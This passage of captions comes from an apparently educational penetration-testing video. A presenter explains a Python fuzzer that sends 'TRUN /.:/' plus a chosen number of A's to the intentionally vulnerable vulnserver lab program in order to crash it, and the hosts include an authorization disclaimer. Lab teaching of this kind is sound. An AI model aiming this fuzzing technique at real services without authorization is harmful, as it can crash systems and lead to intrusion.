00:03:51.260\nthat's kind of where you\nneed to be at this point.\n\n78\n00:03:51.260 --> 00:03:53.670\n&gt;&gt; You need to know loops and\nif statements, probably.\n\n79\n00:03:53.670 --> 00:03:54.800\n&gt;&gt; Right.\n&gt;&gt; At least at a minimum.\n\n80\n00:03:54.800 --> 00:03:56.820\n&gt;&gt; Yeah.\n&gt;&gt; Understand what their purpose is.\n\n81\n00:03:56.820 --> 00:03:59.050\n&gt;&gt; Exactly, and\nwe talked about this earlier,\n\n82\n00:03:59.050 --> 00:04:01.920\nI'm talking about it again\ncuz I can't trust it enough.\n\n83\n00:04:01.920 --> 00:04:02.890\nAnybody who tells you,\n\n84\n00:04:02.890 --> 00:04:07.885\nyou need no programming experience to be\na penetration tester, not a good one.\n\n85\n00:04:07.885 --> 00:04:08.950\n&gt;&gt; [LAUGH]\n&gt;&gt; Or hey yeah,\n\n86\n00:04:08.950 --> 00:04:12.540\nmaybe you can be a penetration tester, but\nnot to be able to do things like this,\n\n87\n00:04:12.540 --> 00:04:15.230\nyou gonna have to differ on\nyour colleagues that can.\n\n88\n00:04:15.230 --> 00:04:18.860\nAnd that's not a bad thing per say, but\nyou wanna be the guy that can do that and\n\n89\n00:04:18.860 --> 00:04:20.700\nthat's gonna help you do jobs to say.\n\n90\n00:04:20.700 --> 00:04:24.080\nYes, I am proficient in at\nleast one programming language.\n\n91\n00:04:24.080 --> 00:04:29.400\nMight I suggest Python, because Python\nis a really easy language to learn.\n\n92\n00:04:29.400 --> 00:04:33.080\nI would also suggest learning Bash\nprogramming and scripting, right?\n\n93\n00:04:33.080 --> 00:04:37.920\nAgain, really easy to learn and\nall the concepts are there for\n\n94\n00:04:37.920 --> 00:04:41.100\nmore difficult programming language for\nyou to be able to jump into there.\n\n95\n00:04:41.100 --> 00:04:44.760\nSo once you learn something's that\na little bit easier then that's gonna\n\n96\n00:04:44.760 --> 00:04:48.420\nhelp you dip into the more difficult\nwaters, the deeper end of the pool.\n\n97\n00:04:48.420 --> 00:04:50.190\nSo I want to give that disclaimer and\nagain,\n\n98\n00:04:50.190 --> 00:04:51.250\nwe always like to give the disclaimer.\n\n99\n00:04:51.250 --> 00:04:55.050\nDon't perform any of these\nthings against servers or\n\n100\n00:04:55.050 --> 00:04:58.600\nservices that you do not own or\nhave authorization to.\n\n101\n00:04:58.600 --> 00:05:01.510\nBecause you can get into a lot of trouble,\nwe don't want you to get in trouble.\n\n102\n00:05:01.510 --> 00:05:03.900\nWe want you to become\nawesome pen testers and\n\n103\n00:05:03.900 --> 00:05:06.360\nnot have a federal record of some sort,\nright?\n\n104\n00:05:06.360 --> 00:05:10.812\n&gt;&gt; I don't know if you can get ITProTV in\nyour jail, [CROSSTALK] that'd be horrible.\n\n105\n00:05:10.812 --> 00:05:15.651\n&gt;&gt; [LAUGH] I don't know, prisons now,\nyou get free Wi-Fi, all of that,\n\n106\n00:05:15.651 --> 00:05:18.380\nit's kinda like a spa with bars [LAUGH].\n\n107\n00:05:18.380 --> 00:05:21.100\nSo that being said,\nremember those things, so\n\n108\n00:05:21.100 --> 00:05:24.110\nwe're gonna assume a little bit\nof programming knowledge here.\n\n109\n00:05:24.110 --> 00:05:26.290\nI will walk you through\na lot of this though.\n\n110\n00:05:26.290 --> 00:05:28.370\nI will explain what's going on.\n\n111\n00:05:28.370 --> 00:05:29.400\nCuz if you're watching us and\n\n112\n00:05:29.400 --> 00:05:32.060\nyou don't know anything about it,\nI do want you to be able to follow along.\n\n113\n00:05:32.060 --> 00:05:33.490\nSo let's jump back into my machine.\n\n114\n00:05:33.490 --> 00:05:36.458\nLet's take a look at my fuzzing\nprogram that I have written.\n\n115\n00:05:36.458 --> 00:05:40.350\nI have pre-written this, so that we\ndon't have to watch me bang out code and\n\n116\n00:05:40.350 --> 00:05:43.740\nfat finger mistype and\ngo why didn't that run right.\n\n117\n00:05:43.740 --> 00:05:45.670\nBecause there's a whitespace character.\n\n118\n00:05:45.670 --> 00:05:47.190\nI made sure all these work before hand.\n\n119\n00:05:47.190 --> 00:05:51.580\nSo don't crucify me because I\ndidn't write this right now.\n\n120\n00:05:51.580 --> 00:05:52.920\n&gt;&gt; [LAUGH]\n&gt;&gt; [INAUDIBLE] Be a 17 part show.\n\n121\n00:05:52.920 --> 00:05:59.530\nSo if I do an ls in this testing\ndirectory, I've got a few things here.\n\n122\n00:05:59.530 --> 00:06:05.890\nOne is my fuzzer.py, .py let's me know\nthis is a Python script or program.\n\n123\n00:06:05.890 --> 00:06:07.960\nSo just remember that.\n\n124\n00:06:07.960 --> 00:06:13.030\nI will open this up in my text\neditor of choice, which is Nano.\n\n125\n00:06:13.030 --> 00:06:16.910\nFuzzer.py, that way we get all the cool\ncolors and things of that nature.\n\n126\n00:06:18.450 --> 00:06:20.830\nSo what are we looking at here?\n\n127\n00:06:20.830 --> 00:06:25.940\nBasically, this is\ncreating a TCP/IP socket\n\n128\n00:06:25.940 --> 00:06:30.820\nto a IP address on a certain port number.\n\n129\n00:06:30.820 --> 00:06:32.889\nAnd I've made that a variable\nat the very top here and\n\n130\n00:06:32.889 --> 00:06:35.030\nyou'll notice this is in port socket.\n\n131\n00:06:35.030 --> 00:06:36.330\nSo you know that that's what we wanna do.\n\n132\n00:06:36.330 --> 00:06:38.420\nI wanna create a network socket and\n\n133\n00:06:38.420 --> 00:06:41.210\nthen here are the two variables\nthat I've created to let it know.\n\n134\n00:06:41.210 --> 00:06:43.150\nThat way, I can go back in and\n\n135\n00:06:43.150 --> 00:06:46.050\nchange it while I can change\njust hard encode that in.\n\n136\n00:06:46.050 --> 00:06:47.290\nLater, if you know anything about Python.\n\n137\n00:06:47.290 --> 00:06:48.980\nYes, you can do that.\n\n138\n00:06:48.980 --> 00:06:52.420\nBut if I wanna run this program\nagain on another server.\n\n139\n00:06:52.420 --> 00:06:55.000\nOr if I want to continue to make changes.\n\n140\n00:06:55.000 --> 00:06:57.980\nOr the IP changes on me,\nit's a DHCP thing.\n\n141\n00:06:57.980 --> 00:07:01.030\nIt's easier just to go into a variable.\n\n142\n00:07:01.030 --> 00:07:03.550\n&gt;&gt; As a penetration tester,\nthis is what you're gonna want to do.\n\n143\n00:07:03.550 --> 00:07:08.154\nYou're gonna want to have a bag full of\nthese scripts that you can simply punch in\n\n144\n00:07:08.154 --> 00:07:10.435\nan IP address and a port number and run.\n\n145\n00:07:10.435 --> 00:07:14.360\nYou don't want to have to rewrite\nthese scripts every job you go to.\n\n146\n00:07:14.360 --> 00:07:14.860\n&gt;&gt; No, no.\n\n147\n00:07:14.860 --> 00:07:16.870\nThat would not be fun at all.\n\n148\n00:07:16.870 --> 00:07:22.330\nUnless you're just a super proficient\nprogrammer and this is nothing to you.\n\n149\n00:07:22.330 --> 00:07:25.210\nBut a lot of guys do\nkeep a bag of scripts, so\n\n150\n00:07:25.210 --> 00:07:27.040\nall they have to do is\ndo some modification.\n\n151\n00:07:27.040 --> 00:07:29.370\nWhen we take a look at\nfinding exploit code,\n\n152\n00:07:29.370 --> 00:07:30.980\nyou'll see that that's\nbasically what it is.\n\n153\n00:07:30.980 --> 00:07:32.110\nYou're gonna grab that code,\n\n154\n00:07:32.110 --> 00:07:36.230\nmodify it to what you needed to do and\nthen implement it.\n\n155\n00:07:36.230 --> 00:07:39.380\nSo it's a good thing\nthat we used variables.\n\n156\n00:07:39.380 --> 00:07:40.920\nVariables make our lives\na whole lot easier.\n\n157\n00:07:40.920 --> 00:07:41.890\nSo that's what I've done here.\n\n158\n00:07:43.290 --> 00:07:43.940\nLet's see here.\n\n159\n00:07:43.940 --> 00:07:44.920\nLet's move down.\n\n160\n00:07:44.920 --> 00:07:51.700\nWe have this length equals int raw_ input\nlength of attack, what is going on here.\n\n161\n00:07:51.700 --> 00:07:52.428\n&gt;&gt; Is that English, Dan?\n\n162\n00:07:52.428 --> 00:07:54.060\n[LAUGH]\n&gt;&gt; [LAUGH] I heavily commented,\n\n163\n00:07:54.060 --> 00:07:57.932\nwell at least I commented the top of\nthis a bit, so that you guys can see.\n\n164\n00:07:57.932 --> 00:08:03.003\nNow what we're doing is take in user input\nto define the length of the fuzz input and\n\n165\n00:08:03.003 --> 00:08:05.148\nmake it a variable called length.\n\n166\n00:08:05.148 --> 00:08:09.191\nSo we're defining a variable and\nwe're calling it length and\n\n167\n00:08:09.191 --> 00:08:13.760\nwe're telling it, ask the user for\ninput at this point, right.\n\n168\n00:08:13.760 --> 00:08:16.430\nThat's why this is raw input right here.\n\n169\n00:08:16.430 --> 00:08:20.910\nSo it's basically going to ask you what is\nthe length of the attack you would like?\n\n170\n00:08:20.910 --> 00:08:23.730\nSo basically we're defining how much data\n\n171\n00:08:23.730 --> 00:08:26.830\nwe want to send to our vulnerable\nserver into its input.\n\n172\n00:08:28.330 --> 00:08:31.620\nAnd then we move down just a bit and\nwe say,\n\n173\n00:08:31.620 --> 00:08:35.670\nlet's create a variable called s\nwhich defines the socket connection.\n\n174\n00:08:35.670 --> 00:08:36.530\nThere it is right here,\n\n175\n00:08:36.530 --> 00:08:40.350\ns = socket.socket and we have a little\nbit of extra that goes along with this.\n\n176\n00:08:40.350 --> 00:08:41.840\nAgain, this is Python programming,\n\n177\n00:08:41.840 --> 00:08:44.140\nwe actually have a Python\nprogramming course here at ITProTV.\n\n178\n00:08:44.140 --> 00:08:46.168\nSo if you haven't seen that,\nyou should check that out,\n\n179\n00:08:46.168 --> 00:08:48.252\nit might help you out a little\nbit of what's going on here.\n\n180\n00:08:48.252 --> 00:08:54.710\nBut right here we get the socket.af_inets,\nthat is the IPv4 address.\n\n181\n00:08:54.710 --> 00:08:58.100\nI could've just hard coded\nthe IPv4 address right here, but\n\n182\n00:08:58.100 --> 00:08:59.940\nI'm using a variable and\nyou'll see that later.\n\n183\n00:08:59.940 --> 00:09:01.690\nAnd then we get stuck\nat that socket stream.\n\n184\n00:09:01.690 --> 00:09:03.790\nWhat type of socket are we creating?\n\n185\n00:09:03.790 --> 00:09:08.240\nThis is a stream, it's going to send\ndata and allow data to come back.\n\n186\n00:09:08.240 --> 00:09:10.020\nWe're keeping an open connection,\nit's a stream.\n\n187\n00:09:11.200 --> 00:09:12.328\nAll right, moving down.\n\n188\n00:09:12.328 --> 00:09:17.026\nConnect = s.connect(TCP_IP and\nTCP_PORT), so there you go,\n\n189\n00:09:17.026 --> 00:09:19.468\nthere it is calling our variables.\n\n190\n00:09:19.468 --> 00:09:24.030\nWhat's the TCP/IP address and\nwhat port do you want me to use?\n\n191\n00:09:24.030 --> 00:09:26.990\nAnd then we're making this\nvariable called connect, so\n\n192\n00:09:26.990 --> 00:09:28.410\nwe can use that later, obviously.\n\n193\n00:09:29.770 --> 00:09:33.220\nMoving down, the scroll, scroll,\nscroll, this is the meat and\n\n194\n00:09:33.220 --> 00:09:36.510\ntaters right here, ladies and\ngents, of I went a little too far.\n\n195\n00:09:36.510 --> 00:09:39.320\nLet me use my cursor here.\n\n196\n00:09:39.320 --> 00:09:40.540\nOnly bad thing about Nano.\n\n197\n00:09:40.540 --> 00:09:43.170\nI guess I can let me just pop that down,\nso\n\n198\n00:09:43.170 --> 00:09:44.570\nwe can get the whole thing on the screen.\n\n199\n00:09:44.570 --> 00:09:45.970\nThere we go.\n\n200\n00:09:45.970 --> 00:09:46.766\nSo what's happening here?\n\n201\n00:09:46.766 --> 00:09:49.750\n[COUGH] Excuse me.\n\n202\n00:09:49.750 --> 00:09:53.580\nWe are printing anything that\nwe receive from the server.\n\n203\n00:09:53.580 --> 00:09:55.040\nSo once we make the connection,\n\n204\n00:09:55.040 --> 00:09:57.770\nit's printing any information\nthat it pipes our way.\n\n205\n00:09:57.770 --> 00:10:00.898\nWe saw that when we connected the\n[INAUDIBLE] server, it never said welcome\n\n206\n00:10:00.898 --> 00:10:04.930\nto [INAUDIBLE] server, type help for help\nto see what commands are available, right?\n\n207\n00:10:04.930 --> 00:10:09.150\nSo we'll see that come back our way\ncuz we created that open socket.\n\n208\n00:10:09.150 --> 00:10:12.400\nThen it says print sending attack length.\n\n209\n00:10:12.400 --> 00:10:18.400\nAnd then whatever length that the user\ndefined when our Python script runs.\n\n210\n00:10:18.400 --> 00:10:21.020\nAnd then it goes to this, TRUN /.;/.\n\n211\n00:10:21.020 --> 00:10:26.970\nWhat is going on here?\n\n212\n00:10:26.970 --> 00:10:30.031\nSo this is an open source program,\nit came with the C code,\n\n213\n00:10:30.031 --> 00:10:31.966\nI can actually look into the C code.\n\n214\n00:10:31.966 --> 00:10:37.850\nAnd for the vuln-server to accept\ninput using the TRUN command.\n\n215\n00:10:37.850 --> 00:10:41.720\nTRUN is a valid command inside\nthe vuln-server's services.\n\n216\n00:10:41.720 --> 00:10:44.770\nFor the input to be valid,\nit needed a special character.\n\n217\n00:10:44.770 --> 00:10:48.060\nActually there's a few\ncommands that take input,\n\n218\n00:10:48.060 --> 00:10:50.760\nfour different ways to\nexploit vuln-server.\n\n219\n00:10:50.760 --> 00:10:54.550\nWe're only gonna show you one because you\nguys can then go play after we show you\n\n220\n00:10:54.550 --> 00:10:55.630\nhow to do this.\n\n221\n00:10:55.630 --> 00:10:59.020\nAnd it will probably get more difficult as\nyou go but you'll have the foundations.\n\n222\n00:10:59.020 --> 00:11:01.590\nAnd then spend sleepless nights pulling\nyour hair out trying to figure out\n\n223\n00:11:01.590 --> 00:11:02.902\nwhy this isn't working.\n\n224\n00:11:02.902 --> 00:11:04.145\n[LAUGH] So there's your-\n&gt;&gt; We'll take if from that angle.\n\n225\n00:11:04.145 --> 00:11:04.645\n[LAUGH]\n&gt;&gt; Yeah.\n\n226\n00:11:04.645 --> 00:11:05.671\nThere's your disclaimer.\n\n227\n00:11:05.671 --> 00:11:08.640\n[LAUGH] You will want to just like\n\n228\n00:11:08.640 --> 00:11:11.920\nkeep a bottle of Jack next to you\ncuz it's gonna be very frustrating.\n\n229\n00:11:11.920 --> 00:11:15.680\nBut there's a special character\nthat is necessary for\n\n230\n00:11:15.680 --> 00:11:20.255\nthat correct input and this would\nbe on any service that's running.\n\n231\n00:11:20.255 --> 00:11:23.854\nIf you're running FTP, right, and\nyou wanted to add a user account,\n\n232\n00:11:23.854 --> 00:11:25.328\nmaybe use an email service.\n\n233\n00:11:25.328 --> 00:11:27.599\nSome SMTP server that you're running,\n\n234\n00:11:27.599 --> 00:11:31.671\nthere are specific commands and\nspecific characters that are needed for\n\n235\n00:11:31.671 --> 00:11:36.580\nthem to work correctly and that would\nbe in the documentation normally.\n\n236\n00:11:36.580 --> 00:11:38.950\nThis did not come with documentation,\nit came with a source code.\n\n237\n00:11:38.950 --> 00:11:41.870\nSo I can look at the source code,\nlet's actually do that.\n\n238\n00:11:41.870 --> 00:11:46.750\nAnd if you're fuzzing an open source piece\nof software, great, you get to do that.\n\n239\n00:11:46.750 --> 00:11:50.800\nThe C code will be included with that\nprogram and you can look to the code.\n\n240\n00:11:50.800 --> 00:11:55.710\nAgain, kind of why you need to be able\nto look at code and see what's going on.\n\n241\n00:11:55.710 --> 00:11:58.610\nDon't need to necessarily be\nable to rewrite it verbatim, but\n\n242\n00:11:58.610 --> 00:12:01.920\nyou at least kind of\nunderstand what's happening.\n\n243\n00:12:01.920 --> 00:12:04.600\nSo let's jump over to our code,\nnow take a look at why that's there.\n\n244\n00:12:05.750 --> 00:12:07.470\nThere's our immunity, it's still running.\n\n245\n00:12:08.470 --> 00:12:11.980\nWould just lower that down, go over here.\n\n246\n00:12:11.980 --> 00:12:15.340\nHere's our source folder for\nthe code and there's vuln-server.c.\n\n247\n00:12:15.340 --> 00:12:19.040\nThat's the C code that's compiled\nthat created the program.\n\n248\n00:12:19.040 --> 00:12:20.520\nIt's just a flat text file.\n\n249\n00:12:20.520 --> 00:12:24.600\nSo you just open it with an editor,\nthere you go.\n\n250\n00:12:24.600 --> 00:12:29.640\nAnd if we scroll down a bit, you see\nthere's the includes for the C code.\n\n251\n00:12:30.950 --> 00:12:32.540\nWhat port it's running on.\n\n252\n00:12:32.540 --> 00:12:34.640\nWhat's default buffer length and\nthings of that nature.\n\n253\n00:12:34.640 --> 00:12:39.530\nThese are all good things for\nus to know as the pen tester here.\n\n254\n00:12:39.530 --> 00:12:45.060\nWe come down a bit, where is it,\nI know it's hiding in here.\n\n255\n00:12:45.060 --> 00:12:47.410\nAnd here we go,\nI think we're getting into it.\n\n256\n00:12:47.410 --> 00:12:49.040\nYeah, you'll start seeing\nthis stuff right here,\n\n257\n00:12:49.040 --> 00:12:52.290\nlike stats, there's our help command.\n\n258\n00:12:52.290 --> 00:12:56.630\nSo these are the commands and\nwhat they're defined to do.\n\n259\n00:12:56.630 --> 00:12:58.060\nHow they operate.\n\n260\n00:12:58.060 --> 00:12:59.920\nThat's this part of the code.\n\n261\n00:12:59.920 --> 00:13:04.680\nSo, once I found that, once I started\nseeing those commands and I can totally\n\n262\n00:13:04.680 --> 00:13:10.750\ngive you guys a little bit better of a\nlook in that if it's not too small there.\n\n263\n00:13:10.750 --> 00:13:12.550\nNo, that's perfect, there we go.\n\n264\n00:13:12.550 --> 00:13:15.850\nSo you see, I saw help,oh I remembered,\nthat's a command.\n\n265\n00:13:15.850 --> 00:13:19.920\nWhen I typed in help,\nI got things like STATS and RTIME and\n\n266\n00:13:19.920 --> 00:13:23.412\nLTIME, those were commands on the system,\nI found the right spot.\n\n267\n00:13:23.412 --> 00:13:28.188\nI wanna make sure and of course,\nshould probably look to this line by line.\n\n268\n00:13:28.188 --> 00:13:35.750\nBut let's look through here, we are using\nthe TRUN command right here, there's TRUN.\n\n269\n00:13:35.750 --> 00:13:42.006\nAnd you'll notice this part right here,\nif ((char)RecvBuf [i] == '.',\n\n270\n00:13:42.006 --> 00:13:46.290\nthen it works correctly is\nbasically what it's saying.\n\n271\n00:13:46.290 --> 00:13:50.030\nThat function is correct, it needs\nthat function to operate correctly.\n\n272\n00:13:50.030 --> 00:13:56.580\nSo there needs to be a period in the data\nthat goes to the input for it to be valid.\n\n273\n00:13:56.580 --> 00:13:59.460\nOtherwise, your buffer\noverflow is not going to work.\n\n274\n00:13:59.460 --> 00:14:01.760\nSo these are things that\nwe need to be able to find.\n\n275\n00:14:01.760 --> 00:14:03.701\nTypically, like I said,\n\n276\n00:14:03.701 --> 00:14:09.804\nthis is part of this learning this what\nthe people that created vuln-server did.\n\n277\n00:14:09.804 --> 00:14:12.499\nSo that you would look at source code,\nfind the problem or\n\n278\n00:14:12.499 --> 00:14:16.290\nat least part of the solution\nto the problem, should I say.\n\n279\n00:14:16.290 --> 00:14:18.940\nAnd implement that in your fuzzing and\nyour exploit.\n\n280\n00:14:18.940 --> 00:14:19.700\nSo we need that.\n\n281\n00:14:19.700 --> 00:14:21.240\nWe need to know that information.\n\n282\n00:14:21.240 --> 00:14:24.590\nThere's also other values in here and\nthat's why you'll see multiple values.\n\n283\n00:14:24.590 --> 00:14:27.560\nI just kind of made the all\nin one value there.\n\n284\n00:14:27.560 --> 00:14:29.870\nSo I'm gonna sort back out of here.\n\n285\n00:14:29.870 --> 00:14:31.960\nYou'll notice that I've got a period.\n\n286\n00:14:31.960 --> 00:14:35.110\nSo it's sending the TRUN command a space.\n\n287\n00:14:35.110 --> 00:14:38.030\nThen a forward slash, a period,\nthen a colon and another forward slash.\n\n288\n00:14:38.030 --> 00:14:40.272\nI don't remember why I added another\nforward slash, maybe that was a fat\n\n289\n00:14:40.272 --> 00:14:41.684\nfinger, but now I can't change it because-\n\n290\n00:14:41.684 --> 00:14:42.228\n&gt;&gt; [LAUGH]\n\n291\n00:14:42.228 --> 00:14:43.810\n&gt;&gt; [LAUGH]\n&gt;&gt; It works.\n\n292\n00:14:43.810 --> 00:14:46.330\n&gt;&gt; Yeah, it works and\nI'm not gonna break it by messing with it.\n\n293\n00:14:46.330 --> 00:14:50.980\nBut that period was necessary for\nmy input to be valid to make this work.\n\n294\n00:14:50.980 --> 00:14:54.250\nSo just keep that in mind, whatever\nservice you're working with, you'll need\n\n295\n00:14:54.250 --> 00:14:57.160\nto know those things before you can\ncreate a fuzzer that works correctly.\n\n296\n00:14:58.290 --> 00:15:01.040\nThen we get into the attack itself.\n\n297\n00:15:01.040 --> 00:15:02.685\nI say I put an attack\nbecause it was generic,\n\n298\n00:15:02.685 --> 00:15:04.610\nbecause really we're still\nin the fuzzing phase.\n\n299\n00:15:04.610 --> 00:15:06.400\nSo I could change that to fuzz.\n\n300\n00:15:06.400 --> 00:15:08.670\nBut just something that helps\nyou know what are we doing.\n\n301\n00:15:09.810 --> 00:15:10.890\nThe attack is the data.\n\n302\n00:15:10.890 --> 00:15:17.690\nThat's what data I want to send to\nthe input system of my vulnerable server.\n\n303\n00:15:17.690 --> 00:15:20.090\nAnd what I'm doing is I'm just\nsending a bunch of capital As.\n\n304\n00:15:20.090 --> 00:15:23.954\nAnd you'll notice that this\nis attack = \"a\" times length.\n\n305\n00:15:23.954 --> 00:15:25.150\nWell, what is length?\n\n306\n00:15:25.150 --> 00:15:28.400\nRemember, we defined length\nhigher in the script.\n\n307\n00:15:28.400 --> 00:15:30.640\nWhen we fire this off, it's gonna ask us.\n\n308\n00:15:30.640 --> 00:15:32.524\nWhat is the length of data\nyou would like to send?\n\n309\n00:15:32.524 --> 00:15:36.080\nAnd I can say 100, 1,000, 10,000,\n1,000,000, whatever it is.\n\n310\n00:15:37.130 --> 00:15:40.270\nI define that, that gets put\ninto length as a variable and\n\n311\n00:15:40.270 --> 00:15:45.240\nnow I'm using that variable to say\na times whatever the user defined.\n\n312\n00:15:45.240 --> 00:15:48.700\nSo if I say 1,000,\nit will send 1,000 As to the input\n\n313\n00:15:48.700 --> 00:15:51.620\nof that system along with\nthe command trun /.:/, right?\n\n314\n00:15:51.620 --> 00:15:54.467\nSo there we go.\n\n315\n00:15:54.467 --> 00:15:58.872\nHopefully, this is flowing, you're in\na zen like state, you're like yeah,\n\n316\n00:15:58.872 --> 00:15:59.805\n[LAUGH] uh-huh.\n\n317\n00:15:59.805 --> 00:16:01.663\nYeah, I'm with you, right?\n\n318\n00:16:01.663 --> 00:16:03.206\nThat's where I want you to be right now.\n\n319\n00:16:03.206 --> 00:16:05.990\nSo then we say, okay, send that.\n\n320\n00:16:05.990 --> 00:16:10.220\nSend the trun, send the attack variable.\n\n321\n00:16:10.220 --> 00:16:14.370\nAnd then we get this /r/n,\nthat's a return character and\n\n322\n00:16:14.370 --> 00:16:16.730\nthen a new line character, right?\n\n323\n00:16:16.730 --> 00:16:19.590\nSo basically hit the Enter key.\n\n324\n00:16:19.590 --> 00:16:21.525\n&gt;&gt; Character turn on old typewriters.\n\n325\n00:16:21.525 --> 00:16:22.243\n&gt;&gt; That's it, you nailed it.\n\n326\n00:16:22.243 --> 00:16:25.921\nSo I like to add that to my stuff cuz\nyou never know when that's gonna be.\n\n327\n00:16:25.921 --> 00:16:30.860\nWell, I want to hit return because return\nenters the command, so that's that.\n\n328\n00:16:30.860 --> 00:16:32.070\nAnd then I want to jump to a new line.\n\n329\n00:16:33.270 --> 00:16:35.850\nIt will print anything that it receives.\n\n330\n00:16:35.850 --> 00:16:39.750\nThere's that good old s.receive,\nand then a buffer length for that.\n\n331\n00:16:39.750 --> 00:16:42.950\nAnd then we wanna send an exit string.\n\n332\n00:16:42.950 --> 00:16:48.320\nOnce you're done, exit out of it,\ntype the exit command, return, new line.\n\n333\n00:16:48.320 --> 00:16:52.910\nPrint anything that it sends back and\nthen close the connection with s.close.\n\n334\n00:16:52.910 --> 00:16:54.910\nSo there is our fuzzer.\n\n335\n00:16:54.910 --> 00:16:57.730\nIt's a very simple script,\nnothing too difficult.\n\n336\n00:16:57.730 --> 00:17:01.670\nBasically all you're seeing here is\nI'm using Python to create a socket\n\n337\n00:17:01.670 --> 00:17:03.670\nconnection, and\nI'm sending some data to it.\n\n338\n00:17:03.670 --> 00:17:06.680\nThat's the two things\nthat is happening here.\n\n339\n00:17:06.680 --> 00:17:11.190\nOne more, it's taking input from the user\non how long the data links should be.\n\n340\n00:17:11.190 --> 00:17:12.020\nThat's it.\n\n341\n00:17:12.020 --> 00:17:12.560\nVery simple.\n\n342\n00:17:12.560 --> 00:17:15.465\nYou can go out to the interwebs and\nsay Python socket code and\n\n343\n00:17:15.465 --> 00:17:18.548\nyou'll probably find a million\nwebsites that say here is how to\n\n344\n00:17:18.548 --> 00:17:20.602\ncreate a socket connection with Python.\n\n345\n00:17:20.602 --> 00:17:21.700\nAnd you can get that.\n\n346\n00:17:21.700 --> 00:17:24.892\nI will make my source code available for\nyou guys into the show notes so\n\n347\n00:17:24.892 --> 00:17:27.990\nthat you can just copy this verbatim\nif you like and play with that.\n\n348\n00:17:27.990 --> 00:17:32.260\nI know it's difficult if you don't\nhave a programming background.\n\n349\n00:17:32.260 --> 00:17:34.450\nTrust me, I know, I know, right?\n\n350\n00:17:34.450 --> 00:17:35.920\nSo I will make this available for\nyou guys.\n\n351\n00:17:37.100 --> 00:17:39.430\nThat being said, let's run this.\n\n352\n00:17:39.430 --> 00:17:41.240\nLet's see what it does.\n\n353\n00:17:41.240 --> 00:17:46.760\nAll right, so let me exit out of here,\nCtrl+x, and we do have that running.\n\n354\n00:17:46.760 --> 00:17:47.916\nI'm just gonna close this source code.\n\n355\n00:17:47.916 --> 00:17:51.020\nSo we don't need that anymore.\n\n356\n00:17:51.020 --> 00:17:53.950\nGo back and then just get my.\n\n357\n00:17:53.950 --> 00:17:55.860\nAll right, so everything's running.\n\n358\n00:17:55.860 --> 00:17:59.580\nImmunity is running,\nthe program has been loaded into Immunity.\n\n359\n00:17:59.580 --> 00:18:01.450\nRemember, we're running\nas administrator here.\n\n360\n00:18:01.450 --> 00:18:04.870\nLet's see what happens when\nwe throw the fuzzer at it.\n\n361\n00:18:06.210 --> 00:18:08.180\nLet's see here, so just ./fuzzer.\n\n362\n00:18:08.180 --> 00:18:14.190\nDon't forget to make your\nlittle sploit here executable.\n\n363\n00:18:14.190 --> 00:18:18.120\nSo if you need to, do the chmod +x\nfuzzer.py so that it will actually run,\n\n364\n00:18:18.120 --> 00:18:20.940\notherwise, you're gonna get nowhere fast.\n\n365\n00:18:20.940 --> 00:18:24.420\nAnd then you can just do fuzzer.py and\nhit return.\n\n366\n00:18:24.420 --> 00:18:27.719\nIt's asking me, what is the length of\nthe attack that I want to throw at it?\n\n367\n00:18:27.719 --> 00:18:30.261\nI'll say okay, I'll throw 1,000 bytes.\n\n368\n00:18:30.261 --> 00:18:31.203\nLet's try that.\n\n369\n00:18:31.203 --> 00:18:31.953\nLet's start there.\n\n370\n00:18:31.953 --> 00:18:32.882\nHit return.\n\n371\n00:18:32.882 --> 00:18:37.109\nThis is sending attack length\n1,000 to Tron Tron complete and\n\n372\n00:18:37.109 --> 00:18:38.545\nan exit with goodbye.\n\n373\n00:18:38.545 --> 00:18:43.467\nCuz remember, we did it come in a lot\nof the send us any input after that and\n\n374\n00:18:43.467 --> 00:18:46.460\nthen it closed down but I'm out of there.\n\n375\n00:18:46.460 --> 00:18:47.180\nWhat's going on here?\n\n376\n00:18:47.180 --> 00:18:50.050\nCome back over here,\nI look at my Immunity.\n\n377\n00:18:50.050 --> 00:18:52.470\nAnd it's still running.\n\n378\n00:18:52.470 --> 00:18:56.020\nSo yeah,\nlook down in the bottom right-hand corner.\n\n379\n00:18:56.020 --> 00:18:58.080\nIf you can do a full screen for\nme real quick.\n\n380\n00:18:58.080 --> 00:18:58.824\nThere you go.\n\n381\n00:18:58.824 --> 00:19:00.420\nYou'll see, still running.\n\n382\n00:19:00.420 --> 00:19:01.570\nSo this program is still running.\n\n383\n00:19:01.570 --> 00:19:03.180\nIt did not crash.\n\n384\n00:19:03.180 --> 00:19:05.520\nLet me shrink down Immunity\njust to make sure.\n\n385\n00:19:05.520 --> 00:19:08.180\nMaybe it's just a glitch in the system.\n\n386\n00:19:08.180 --> 00:19:12.050\nNope, it's still saying connections,\nit's still waiting for connections.\n\n387\n00:19:12.050 --> 00:19:13.790\nIt did close a connection, but\n\n388\n00:19:13.790 --> 00:19:17.500\nit's still sitting there with a blinking\nlight allowing connections to come in.\n\n389\n00:19:17.500 --> 00:19:19.200\nSo we didn't crash the program.\n\n390\n00:19:19.200 --> 00:19:21.100\nLet's bump up our game a little bit.\n\n391\n00:19:21.100 --> 00:19:22.780\nAnd you can be increasing\nthis by anything.\n\n392\n00:19:22.780 --> 00:19:26.180\nYou could create a program\nthat does a loop that tries to\n\n393\n00:19:26.180 --> 00:19:29.450\nincrementally throw data at it\nuntil it finds the right amount.\n\n394\n00:19:29.450 --> 00:19:36.346\nI tend to not like those though,\nbecause I just don't like those.\n\n395\n00:19:36.346 --> 00:19:40.539\nI like to be able to say let's try this,\nand then take a look,\n\n396\n00:19:40.539 --> 00:19:43.375\nexamine, okay that didn't work.\n\n397\n00:19:43.375 --> 00:19:46.369\nLet's try this, let me back up okay.\n\n398\n00:19:46.369 --> 00:19:49.545\nI like to be a little more in control\nthan just let my loops take a-\n\n399\n00:19:49.545 --> 00:19:50.785\n&gt;&gt; Yeah, absolutely and\n\n400\n00:19:50.785 --> 00:19:52.085\nmakes a lot less noise.\n\n401\n00:19:52.085 --> 00:19:56.887\nIf you just have one is gonna send\na 1,000 and then 1,100 then 1,200 then\n\n402\n00:19:56.887 --> 00:20:01.720\n1,300 then 1,500, eventually when\nit gets to 22,000, it crashes.\n\n403\n00:20:01.720 --> 00:20:05.858\nWell, that was a lot talking to that\nprogram and very easily could cause other\n\n404\n00:20:05.858 --> 00:20:09.995\nissues on the network or be detected if\nyou're trying to do a black box type pin\n\n405\n00:20:09.995 --> 00:20:13.265\ntest, whereas if I did 1,000,\nthat didn't crash it.\n\n406\n00:20:13.265 --> 00:20:17.320\n10,000 did crash it, okay,\nlet's divide that in half to 